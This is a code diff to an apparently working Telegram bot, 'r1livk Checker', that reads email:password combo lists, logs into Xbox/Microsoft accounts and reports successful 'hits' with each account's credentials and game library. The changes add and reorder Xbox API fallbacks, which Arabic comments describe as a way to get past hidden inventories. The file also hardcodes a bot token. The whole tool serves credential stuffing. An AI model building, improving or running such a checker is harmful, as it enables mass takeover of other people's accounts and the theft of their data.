@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Checker ⚡ - Telegram Bot (Device Token & Pro Inventory Mode - Enhanced Hidden Bypass)
+r1livk Checker ⚡ - Telegram Bot (Device Token & Pro Inventory Mode)
 """
 
 import os
@@ -19,7 +19,7 @@ from telebot import types
 urllib3.disable_warnings()
 
 TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
-OWNER_ID = 6266959915
+OWNER_ID = 6266959915  # <--- تم إضافة الـ ID الخاص بك هنا بنجاح
 bot = telebot.TeleBot(TOKEN)
 
 REQUEST_TIMEOUT = 25
@@ -129,7 +129,6 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                     except:
                         pass
 
-            # المحاولة الأولى: فحص الـ Inventory الأساسي
             if xuid:
                 entitlements_url = f"https://inventory.xboxlive.com/users/xuid({xuid})/inventory/products?type=Game"
                 ent_resp = session.get(entitlements_url, headers=headers, timeout=10)
@@ -150,7 +149,20 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                             if counter > 20:
                                 break
 
-            # المحاولة الثانية لتجاوز الـ Hidden: فحص سجل الإنجازات والـ Titles الملعوبة في حال كان الـ Inventory فارغاً
+            # المحاولة البديلة عبر TitleHub لتجاوز الـ Hidden وإحضار الألعاب الفعلية
+            if not owned_games_formatted and xuid:
+                th_url = f"https://titlehub.xboxlive.com/users/xuid({xuid})/titles/batch"
+                th_resp = session.post(th_url, json={"arrangeBy": "lastTimePlayed", "includeAll": True}, headers=headers, timeout=10)
+                if th_resp.status_code == 200:
+                    counter = 1
+                    for title in th_resp.json().get("titles", []):
+                        t_name = title.get("name") or title.get("shortName")
+                        if t_name:
+                            owned_games_formatted.append(f"{counter} - {t_name}")
+                            counter += 1
+                            if counter > 20:
+                                break
+
             if not owned_games_formatted and xuid:
                 history_url = f"https://achievements.xboxlive.com/users/xuid({xuid})/history/titles"
                 history_resp = session.get(history_url, headers=headers, timeout=10)
@@ -165,21 +177,6 @@ def fetch_xbox_extra_details_pro(session, xb_token, uhs):
                         
                         if t_name:
                             owned_games_formatted.append(f"{counter} - {t_name} | Score: {earned_gs}G")
-                            counter += 1
-                            if counter > 20:
-                                break
-
-            # المحاولة الثالثة الاحتياطية لتخطي الحسابات المقفلة تماماً عبر استعلام الـ TitleHub
-            if not owned_games_formatted and xuid:
-                titlehub_url = f"https://titlehub.xboxlive.com/users/xuid({xuid})/titles/batch?selectedproperties=ShortName,Name"
-                th_resp = session.post(titlehub_url, json={"arrangeBy": "lastTimePlayed", "includeAll": True}, headers=headers, timeout=10)
-                if th_resp.status_code == 200:
-                    th_data = th_resp.json()
-                    counter = 1
-                    for title in th_data.get("titles", []):
-                        t_name = title.get("name") or title.get("shortName")
-                        if t_name:
-                            owned_games_formatted.append(f"{counter} - {t_name} (Played)")
                             counter += 1
                             if counter > 20:
                                 break
@@ -325,7 +322,7 @@ def check_single_account(combo):
 
         session.close()
 
-        games_str = "\n".join([f"  - {g}" for g in owned_games_list]) if owned_games_list else "  - No games found / Hidden"
+        games_str = "\n".join([f"{g}" for g in owned_games_list]) if owned_games_list else "  - No games found / Hidden"
 
         hit_info = (
             f"{email}:{password}\n"
@@ -578,5 +575,5 @@ def process_checker(chat_id, filepath, lines):
     active_scans[chat_id] = False
 
 if __name__ == "__main__":
-    print("r1livk Catalog Mode Checker Bot is running (Enhanced Hidden Bypass)...")
+    print("r1livk Catalog Mode Checker Bot is running...")
     bot.infinity_polling()
